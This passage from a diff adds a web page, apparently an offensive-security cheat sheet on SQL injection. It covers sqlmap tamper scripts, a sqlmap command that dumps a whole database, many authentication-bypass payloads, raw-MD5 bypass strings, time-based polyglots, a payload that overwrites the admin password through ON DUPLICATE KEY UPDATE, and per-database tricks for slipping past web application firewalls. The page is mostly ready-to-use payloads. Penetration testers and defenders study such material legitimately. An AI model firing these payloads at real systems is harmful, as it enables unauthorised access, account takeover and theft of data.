+<td>Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054)</td>
+</tr>
+<tr>
+<td>commalesslimit.py</td>
+<td>Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'</td>
+</tr>
+<tr>
+<td>commalessmid.py</td>
+<td>Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'</td>
+</tr>
+<tr>
+<td>commentbeforeparentheses.py</td>
+<td>Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/()</td>
+</tr>
+<tr>
+<td>concat2concatws.py</td>
+<td>Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'</td>
+</tr>
+<tr>
+<td>charencode.py</td>
+<td>Url-encodes all characters in a given payload (not processing already encoded)</td>
+</tr>
+<tr>
+<td>charunicodeencode.py</td>
+<td>Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)</td>
+</tr>
+<tr>
+<td>equaltolike.py</td>
+<td>Replaces all occurrences of operator equal ('=') with operator 'LIKE'</td>
+</tr>
+<tr>
+<td>escapequotes.py</td>
+<td>Slash escape quotes (' and ")</td>
+</tr>
+<tr>
+<td>greatest.py</td>
+<td>Replaces greater than operator ('&gt;') with 'GREATEST' counterpart</td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords.py</td>
+<td>Adds versioned MySQL comment before each keyword</td>
+</tr>
+<tr>
+<td>htmlencode.py</td>
+<td>HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -&gt; &#39;)</td>
+</tr>
+<tr>
+<td>ifnull2casewhenisnull.py</td>
+<td>Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart</td>
+</tr>
+<tr>
+<td>ifnull2ifisnull.py</td>
+<td>Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'</td>
+</tr>
+<tr>
+<td>informationschemacomment.py</td>
+<td>Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier</td>
+</tr>
+<tr>
+<td>least.py</td>
+<td>Replaces greater than operator (‘&gt;’) with ‘LEAST’ counterpart</td>
+</tr>
+<tr>
+<td>lowercase.py</td>
+<td>Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)</td>
+</tr>
+<tr>
+<td>modsecurityversioned.py</td>
+<td>Embraces complete query with versioned comment</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned.py</td>
+<td>Embraces complete query with zero-versioned comment</td>
+</tr>
+<tr>
+<td>multiplespaces.py</td>
+<td>Adds multiple spaces around SQL keywords</td>
+</tr>
+<tr>
+<td>nonrecursivereplacement.py</td>
+<td>Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters</td>
+</tr>
+<tr>
+<td>overlongutf8.py</td>
+<td>Converts all characters in a given payload (not processing already encoded)</td>
+</tr>
+<tr>
+<td>overlongutf8more.py</td>
+<td>Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)</td>
+</tr>
+<tr>
+<td>percentage.py</td>
+<td>Adds a percentage sign ('%') infront of each character</td>
+</tr>
+<tr>
+<td>plus2concat.py</td>
+<td>Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart</td>
+</tr>
+<tr>
+<td>plus2fnconcat.py</td>
+<td>Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart</td>
+</tr>
+<tr>
+<td>randomcase.py</td>
+<td>Replaces each keyword character with random case value</td>
+</tr>
+<tr>
+<td>randomcomments.py</td>
+<td>Add random comments to SQL keywords</td>
+</tr>
+<tr>
+<td>securesphere.py</td>
+<td>Appends special crafted string</td>
+</tr>
+<tr>
+<td>sp_password.py</td>
+<td>Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs</td>
+</tr>
+<tr>
+<td>space2comment.py</td>
+<td>Replaces space character (' ') with comments</td>
+</tr>
+<tr>
+<td>space2dash.py</td>
+<td>Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')</td>
+</tr>
+<tr>
+<td>space2hash.py</td>
+<td>Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')</td>
+</tr>
+<tr>
+<td>space2morehash.py</td>
+<td>Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')</td>
+</tr>
+<tr>
+<td>space2mssqlblank.py</td>
+<td>Replaces space character (' ') with a random blank character from a valid set of alternate characters</td>
+</tr>
+<tr>
+<td>space2mssqlhash.py</td>
+<td>Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')</td>
+</tr>
+<tr>
+<td>space2mysqlblank.py</td>
+<td>Replaces space character (' ') with a random blank character from a valid set of alternate characters</td>
+</tr>
+<tr>
+<td>space2mysqldash.py</td>
+<td>Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')</td>
+</tr>
+<tr>
+<td>space2plus.py</td>
+<td>Replaces space character (' ') with plus ('+')</td>
+</tr>
+<tr>
+<td>space2randomblank.py</td>
+<td>Replaces space character (' ') with a random blank character from a valid set of alternate characters</td>
+</tr>
+<tr>
+<td>symboliclogical.py</td>
+<td>Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and</td>
+</tr>
+<tr>
+<td>unionalltounion.py</td>
+<td>Replaces UNION ALL SELECT with UNION SELECT</td>
+</tr>
+<tr>
+<td>unmagicquotes.py</td>
+<td>Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)</td>
+</tr>
+<tr>
+<td>uppercase.py</td>
+<td>Replaces each keyword character with upper case value 'INSERT'</td>
+</tr>
+<tr>
+<td>varnish.py</td>
+<td>Append a HTTP header 'X-originating-IP'</td>
+</tr>
+<tr>
+<td>versionedkeywords.py</td>
+<td>Encloses each non-function keyword with versioned MySQL comment</td>
+</tr>
+<tr>
+<td>versionedmorekeywords.py</td>
+<td>Encloses each keyword with versioned MySQL comment</td>
+</tr>
+<tr>
+<td>xforwardedfor.py</td>
+<td>Append a fake HTTP header 'X-Forwarded-For'</td>
+</tr>
+</tbody>
+</table>
+<h3 id="sqlmap-without-sql-injection">SQLmap without SQL injection</h3>
+<p>You can use SQLmap to access a database via its port instead of a URL.</p>
+<pre><code class="language-ps1">sqlmap.py -d &quot;mysql://user:pass@ip/database&quot; --dump-all 
+</code></pre>
+<h2 id="authentication-bypass">Authentication bypass</h2>
+<pre><code class="language-sql">'-'
+' '
+'&amp;'
+'^'
+'*'
+' or 1=1 limit 1 -- -+
+'=&quot;or'
+' or ''-'
+' or '' '
+' or ''&amp;'
+' or ''^'
+' or ''*'
+'-||0'
+&quot;-||0&quot;
+&quot;-&quot;
+&quot; &quot;
+&quot;&amp;&quot;
+&quot;^&quot;
+&quot;*&quot;
+'--'
+&quot;--&quot;
+'--' / &quot;--&quot;
+&quot; or &quot;&quot;-&quot;
+&quot; or &quot;&quot; &quot;
+&quot; or &quot;&quot;&amp;&quot;
+&quot; or &quot;&quot;^&quot;
+&quot; or &quot;&quot;*&quot;
+or true--
+&quot; or true--
+' or true--
+&quot;) or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+&quot; or &quot;x&quot;=&quot;x
+&quot;) or (&quot;x&quot;)=(&quot;x
+&quot;)) or ((&quot;x&quot;))=((&quot;x
+or 2 like 2
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' -- -
+admin' #
+admin'/*
+admin' or '2' LIKE '1
+admin' or 2 LIKE 2--
+admin' or 2 LIKE 2#
+admin') or 2 LIKE 2#
+admin') or 2 LIKE 2--
+admin') or ('2' LIKE '2
+admin') or ('2' LIKE '2'#
+admin') or ('2' LIKE '2'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin&quot; --
+admin';-- azer 
+admin&quot; #
+admin&quot;/*
+admin&quot; or &quot;1&quot;=&quot;1
+admin&quot; or &quot;1&quot;=&quot;1&quot;--
+admin&quot; or &quot;1&quot;=&quot;1&quot;#
+admin&quot; or &quot;1&quot;=&quot;1&quot;/*
+admin&quot;or 1=1 or &quot;&quot;=&quot;
+admin&quot; or 1=1
+admin&quot; or 1=1--
+admin&quot; or 1=1#
+admin&quot; or 1=1/*
+admin&quot;) or (&quot;1&quot;=&quot;1
+admin&quot;) or (&quot;1&quot;=&quot;1&quot;--
+admin&quot;) or (&quot;1&quot;=&quot;1&quot;#
+admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*
+admin&quot;) or &quot;1&quot;=&quot;1
+admin&quot;) or &quot;1&quot;=&quot;1&quot;--
+admin&quot;) or &quot;1&quot;=&quot;1&quot;#
+admin&quot;) or &quot;1&quot;=&quot;1&quot;/*
+1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055
+</code></pre>
+<h2 id="authentication-bypass-raw-md5-sha1">Authentication Bypass (Raw MD5 SHA1)</h2>
+<p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p>
+<pre><code class="language-php">&quot;SELECT * FROM admin WHERE pass = '&quot;.md5($password,true).&quot;'&quot;
+</code></pre>
+<p>Allowing an attacker to craft a string with a <code>true</code> statement such as <code>' or 'SOMETHING</code></p>
+<pre><code class="language-php">md5(&quot;ffifdyop&quot;, true) = 'or'6�]��!r,��b
+sha1(&quot;3fDf &quot;, true) = Q�u'='�@�[�t�- o��_-!
+</code></pre>
+<p>Challenge demo available at <a href="http://web.jarvisoj.com:32772">http://web.jarvisoj.com:32772</a></p>
+<h2 id="polyglot-injection-multicontext">Polyglot injection (multicontext)</h2>
+<pre><code class="language-sql">SLEEP(1) /*' or SLEEP(1) or '&quot; or SLEEP(1) or &quot;*/
+
+/* MySQL only */
+IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|&quot;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&quot;*/
+</code></pre>
+<h2 id="routed-injection">Routed injection</h2>
+<pre><code class="language-sql">admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+</code></pre>
+<h2 id="insert-statement-on-duplicate-key-update">Insert Statement - ON DUPLICATE KEY UPDATE</h2>
+<p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p>
+<pre><code class="language-sql">Inject using payload:
+  attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY UPDATE password=&quot;bcrypt_hash_of_qwerty&quot; --
+
+The query would look like this:
+INSERT INTO users (email, password) VALUES (&quot;attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY UPDATE password=&quot;bcrypt_hash_of_qwerty&quot; -- &quot;, &quot;bcrypt_hash_of_your_password_input&quot;);
+
+This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
+Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to &quot;bcrypt_hash_of_qwerty&quot;.
+
+After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
+</code></pre>
+<h2 id="waf-bypass">WAF Bypass</h2>
+<h3 id="white-spaces-alternatives">White spaces alternatives</h3>
+<p>No Space (%20) - bypass using whitespace alternatives</p>
+<pre><code class="language-sql">?id=1%09and%091=1%09--
+?id=1%0Dand%0D1=1%0D--
+?id=1%0Cand%0C1=1%0C--
+?id=1%0Band%0B1=1%0B--
+?id=1%0Aand%0A1=1%0A--
+?id=1%A0and%A01=1%A0--
+</code></pre>
+<p>No Whitespace - bypass using comments</p>
+<pre><code class="language-sql">?id=1/*comment*/and/**/1=1/**/--
+</code></pre>
+<p>No Whitespace - bypass using parenthesis</p>
+<pre><code class="language-sql">?id=(1)and(1)=(1)--
+</code></pre>
+<p>Whitespace alternatives by DBMS
+| DBMS | ASCII characters in hexadicimal |
+| ---- | ------------------------------- |
+| SQLite3 | 0A, 0D, 0C, 09, 20 |
+| MySQL 5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
+| MySQL 3   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
+| PostgreSQL | 0A, 0D, 0C, 09, 20 |
+| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
+| MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |</p>
+<p>Example of query where spaces were replaced by ascii characters above 0x80</p>
+<pre><code>♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
+</code></pre>
+<h3 id="no-comma">No Comma</h3>
+<p>Bypass using OFFSET, FROM and JOIN</p>
+<pre><code class="language-sql">LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0
+SUBSTR('SQL',1,1) -&gt; SUBSTR('SQL' FROM 1 FOR 1).
+SELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
+</code></pre>
+<h3 id="no-equal">No Equal</h3>
+<p>Bypass using LIKE/NOT IN/IN/BETWEEN</p>
+<pre><code class="language-sql">?id=1 and substring(version(),1,1)like(5)
+?id=1 and substring(version(),1,1)not in(4,3)
+?id=1 and substring(version(),1,1)in(4,3)
+?id=1 and substring(version(),1,1) between 3 and 4
+</code></pre>
+<h3 id="case-modification">Case modification</h3>
+<p>Bypass using uppercase/lowercase (see keyword AND)</p>
+<pre><code class="language-sql">?id=1 AND 1=1#
+?id=1 AnD 1=1#
+?id=1 aNd 1=1#
+</code></pre>
+<p>Bypass using keywords case insensitive / Bypass using an equivalent operator</p>
+<pre><code class="language-sql">AND   -&gt; &amp;&amp;
+OR    -&gt; ||
+=     -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;
+&gt; X   -&gt; not between 0 and X
+WHERE -&gt; HAVING
+</code></pre>
+<h3 id="obfuscation-by-dbms">Obfuscation by DBMS</h3>
+<p>MySQL</p>
+<pre><code>1.UNION SELECT  2   
+3.2UNION    SELECT  2   
+1e0UNION    SELECT  2   
+SELECT\N/0.e3UNION  SELECT  2   
+1e1AND-0.0UNION SELECT  2   
+1/*!12345UNION/*!31337SELECT/*!table_name*/ 
+{ts 1}UNION SELECT.``   1.e.table_name  
+SELECT  $.``    1.e.table_name  
+SELECT{_    .``1.e.table_name}  
+SELECT  LightOS .   ``1.e.table_name    LightOS 
+SELECT  information_schema 1337.e.tables    13.37e.table_name   
+SELECT  1   from    information_schema 9.e.table_name
+</code></pre>
+<p>MSSQL</p>
+<pre><code>.1UNION SELECT  2   
+1.UNION SELECT.2alias   
+1e0UNION    SELECT  2   
+1e1AND-1=0.0UNION   SELECT  2   
+SELECT  0xUNION SELECT  2   
+SELECT\UNION    SELECT  2   
+\1UNION SELECT  2   
+SELECT  1FROM[table]WHERE\1=\1AND\1=\1  
+SELECT&quot;table_name&quot;FROM[information_schema].[tables] 
+</code></pre>
+<p>Oracle</p>
+<pre><code>1FUNION SELECT  2   
+1DUNION SELECT  2   
+SELECT  0x7461626c655f6e616d65  FROM    all_tab_tables
+SELECT  CHR(116)    ||  CHR(97) ||  CHR(98) FROM    all_tab_tables
+SELECT%00table_name%00FROM%00all_tab_tables
+</code></pre>
+<h3 id="more-mysql-specific">More MySQL specific</h3>
+<p><code>information_schema.tables</code> alternative</p>
+<pre><code class="language-sql">select * from mysql.innodb_table_stats;
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
+| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
+...
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+
+mysql&gt; show tables in dvwa;
++----------------+
+| Tables_in_dvwa |
++----------------+
+| guestbook      |
+| users          |
++----------------+
+</code></pre>
+<p>Version Alternative</p>
+<pre><code class="language-sql">mysql&gt; select @@innodb_version;
++------------------+
+| @@innodb_version |
++------------------+
+| 5.6.31           |
++------------------+
+
+mysql&gt; select @@version;
++-------------------------+
+| @@version               |
++-------------------------+
+| 5.6.31-0ubuntu0.15.10.1 |
++-------------------------+
+
+mysql&gt; mysql&gt; select version();
++-------------------------+
+| version()               |
++-------------------------+
+| 5.6.31-0ubuntu0.15.10.1 |
++-------------------------+
+</code></pre>
+<h4 id="waf-bypass-for-mysql-using-scientific-notation">WAF bypass for MySQL using scientific notation</h4>
+<p>Blocked</p>
+<pre><code class="language-sql">' or ''='
+</code></pre>
+<p>Working</p>
+<pre><code class="language-sql">' or 1.e('')='
+</code></pre>
+<p>Obfuscated query</p>
+<pre><code class="language-sql">1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li>Detect SQLi</li>
+<li><a href="https://gerbenjavado.com/manual-sql-injection-discovery-tips/">Manual SQL Injection Discovery Tips</a></li>
+<li><a href="https://sqlwiki.netspi.com/">NetSPI SQL Injection Wiki</a></li>
+<li>MySQL:</li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">PentestMonkey's mySQL injection cheat sheet</a></li>
+<li><a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/">Reiners mySQL injection Filter Evasion Cheatsheet</a></li>
+<li><a href="https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/">Alternative for Information_Schema.Tables in MySQL</a></li>
+<li><a href="https://websec.ca/kb/sql_injection">The SQL Injection Knowledge base</a></li>
+<li>MSSQL:</li>
+<li><a href="http://evilsql.com/main/page2.php">EvilSQL's Error/Union/Blind MSSQL Cheatsheet</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">PentestMonkey's MSSQL SQLi injection Cheat Sheet</a></li>
+<li>ORACLE:</li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">PentestMonkey's Oracle SQLi Cheatsheet</a></li>
+<li>POSTGRESQL:</li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">PentestMonkey's Postgres SQLi Cheatsheet</a></li>
+<li>Others</li>
+<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">SQLi Cheatsheet - NetSparker</a></li>
+<li><a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">Access SQLi Cheatsheet</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet">PentestMonkey's Ingres SQL Injection Cheat Sheet</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet">Pentestmonkey's DB2 SQL Injection Cheat Sheet</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet">Pentestmonkey's Informix SQL Injection Cheat Sheet</a></li>
+<li><a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet">SQLite3 Injection Cheat sheet</a></li>
+<li><a href="http://rails-sqli.org/">Ruby on Rails (Active Record) SQL Injection Guide</a></li>
+<li><a href="http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html">ForkBombers SQLMap Tamper Scripts Update</a></li>
+<li><a href="https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/">SQLi in INSERT worse than SELECT</a></li>
+<li><a href="https://gerbenjavado.com/manual-sql-injection-discovery-tips/">Manual SQL Injection Tips</a></li>
+<li>Second Order:</li>
+<li><a href="https://www.notsosecure.com/analyzing-cve-2018-6376/">Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection</a></li>
+<li><a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/">Exploiting Second Order SQLi Flaws by using Burp &amp; Custom Sqlmap Tamper</a></li>
+<li>Sqlmap:</li>
+<li><a href="https://twitter.com/zh4ck/status/972441560875970560">#SQLmap protip @zh4ck</a></li>
+<li>WAF:</li>
+<li><a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf">SQLi Optimization and Obfuscation Techniques</a> by Roberto Salgado</li>
+<li><a href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/">A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection</a></li>
+</ul>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2022</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../SAML%20Injection/" class="md-footer__link md-footer__link--prev" aria-label="Previous: SAML Injection" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              SAML Injection
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="BigQuery%20Injection/" class="md-footer__link md-footer__link--next" aria-label="Next: Google BigQuery SQL Injection" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Google BigQuery SQL Injection
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.top", "navigation.tracking"], "search": "../assets/javascripts/workers/search.ecf98df9.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.2ab50757.min.js"></script>
+      
+    
+  </body>
+</html>
